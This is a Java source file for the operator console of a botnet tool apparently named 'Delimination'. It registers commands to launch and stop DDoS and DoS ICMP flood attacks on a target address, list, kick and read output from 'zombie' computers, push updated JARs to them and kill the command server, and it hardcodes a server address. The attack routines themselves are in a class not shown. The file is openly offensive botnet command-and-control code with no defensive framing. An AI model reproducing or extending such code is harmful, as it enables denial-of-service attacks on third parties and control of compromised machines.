package org.ddos.client.command;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;

import org.ddos.network.ClientNetwork;
import org.jcom.Command;
import org.jcom.CommandCompletionListener;
import org.jcom.CommandData;
import org.jcom.CommandInterface;
import org.jcom.CommandInterruptedException;
import org.jcom.FlagData;
import org.jcom.Interpreter;
import org.jcom.InvalidCommandArgumentsException;
import org.jcom.UnknownCommandException;
import org.jcom.UnknownFlagException;
import org.jnetwork.DataPackage;

public class ClientCommands {
	private CommandInterface commands = new CommandInterface();

	public ClientCommands() {
		try (BufferedReader in = new BufferedReader(
				new InputStreamReader(new URL("http://checkip.amazonaws.com").openStream()))) {
			commands.addInterpreter(new Interpreter("%this%", in.readLine()));
		} catch (IOException e) {
			e.printStackTrace();
		}
		commands.addInterpreter(new Interpreter("%server%", "server2.jacobsrandomsite.com:25565"));

		commands.addCommandCompletionListener(new CommandCompletionListener() {
			@Override
			public void commandCompleted(Command c, CommandData d) {
				try {
					if (c.getBaseCommand().equals("rz")) {
						ClientNetwork.getClient().getOutputStream().writeObject(
								new DataPackage(c.getCommandArguments()[0]).setMessage("STOP_READ_ZOMBIE"));
					} else if (c.getBaseCommand().equals("rs")) {
						ClientNetwork.getClient().getOutputStream()
								.writeObject(new DataPackage().setMessage("STOP_READ_SERVER"));
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});

		commands.putCommand("ddos",
				new CommandData("ddos [start|stop] <address> {-l size, -t threads, -v valid}",
						"Starts or stops an attack on address.", 2, CommandActions.getDdosAction(),
						new FlagData("-l", "An integer which represents the byte size of each ICMP packet."),
						new FlagData("-t", "An integer which represents the amount of threads which will be pinging."),
						new FlagData("-v", "Checks if the address is valid before the DDoS starts.")));
		commands.putCommand("banlist",
				new CommandData("banlist", "Lists all the banned computers.", 0, CommandActions.getBanlistAction()),
				new CommandData("banlist [add|remove] <address>", "Adds or removes an IP address from the banlist.", 2,
						CommandActions.getBanlistAction()));
		commands.putCommand("echo", new CommandData("echo <data...>", "Echos out the given data to the console.", -1,
				CommandActions.getEchoActions()));
		commands.putCommand("disconnect", new CommandData("disconnect", "Disconnects from the Delimination server.", 0,
				CommandActions.getDisconnectAction()));
		commands.putCommand("connect", new CommandData("connect", "Connects back to the Delimination server.", 0,
				CommandActions.getConnectAction()));
		commands.putCommand("status", new CommandData("status", "Gets the status of all DDoSes in progress.", 0,
				CommandActions.getStatusAction()));
		commands.putCommand("rz",
				new CommandData("rz <address>",
						"Continuously reads the output from a zombie computer until the command is exited.", 1,
						CommandActions.getReadFromZombieAction()));
		commands.putCommand("update", new CommandData("update [server|this|zombie] {-i address}",
				"Gets the newest version of the Delimination JAR for the specified target.", 1,
				CommandActions.getUpdateAction(), new FlagData("-i",
						"Sets the address of the computer whose client will be updated. Required if it is a zombie that is being updated.")));
		commands.putCommand("rs",
				new CommandData("rs", "Continuously reads the output from the server until the command is exited.", 0,
						CommandActions.getReadFromServerAction()));
		commands.putCommand("dos",
				new CommandData("dos [start|stop] <address> {-l size, -t threads, -v valid}",
						"Starts or stops an attack on address, where all pinging threads are ran on the local machine.",
						2, CommandActions.getDosAction(),
						new FlagData("-l", "An integer which represents the byte size of each ICMP packet."),
						new FlagData("-t", "An integer which represents the amount of threads which will be pinging."),
						new FlagData("-v", "Checks if the address is valid before the DoS starts.")));
		commands.putCommand("kick",
				new CommandData("kick",
						"Kicks all of the zombies from the server. They will all have to reconnect to the server.", 0,
						CommandActions.getKickAllZombiesAction()),
				new CommandData("kick <address...>",
						"Kicks all given zombies from the server. The zombies will have to reconnect to the server.",
						-1, CommandActions.getKickAction()));
		commands.putCommand("list",
				new CommandData("list [zombies|clients|computers]",
						"Gets the IP addresses of all the given types of computers given connected to the server.", 1,
						CommandActions.getListAction()));
		commands.putCommand("ks",
				new CommandData("ks", "Shuts down the server remotely.", 0, CommandActions.getKillServerAction()));
		commands.putCommand("help",
				new CommandData("help", "Lists all commands and their usage.", 0,
						CommandActions.getUniversalHelpAction()),
				new CommandData("help <command>", "Gets help for the specified command.", 1,
						CommandActions.getHelpForCommandAction()));
		commands.putCommand("ping", new CommandData("ping <address>", "Pings the given address four times.", 1,
				CommandActions.getPingAction()));
		commands.putCommand("wait",
				new CommandData("wait", "Waits until the user stops the command.", 0, CommandActions.getWaitAction()),
				new CommandData("wait <time>", "Waits for a given amount of milliseconds.", 1,
						CommandActions.getWaitForMillisecondsAction()));
		commands.putCommand("valid", new CommandData("valid <address>", "Gets if the given IP address exists.", 1,
				CommandActions.getValidAddressAction()));
		commands.putCommand("exit", new CommandData("exit", "Exits the Delimination client.", 0,
				CommandActions.getExitAction(), new FlagData("-k", "Kicks all of the zombies off of the server.")));
	}

	public void executeCommand(Command command) throws UnknownCommandException, InvalidCommandArgumentsException,
			CommandInterruptedException, UnknownFlagException {
		commands.executeCommand(command);
	}

	public CommandData[] getCommandData(String baseCommand) throws UnknownCommandException {
		return commands.getCommandData(baseCommand);
	}

	public Command parseCommand(String raw) {
		return commands.parseCommand(raw);
	}
}
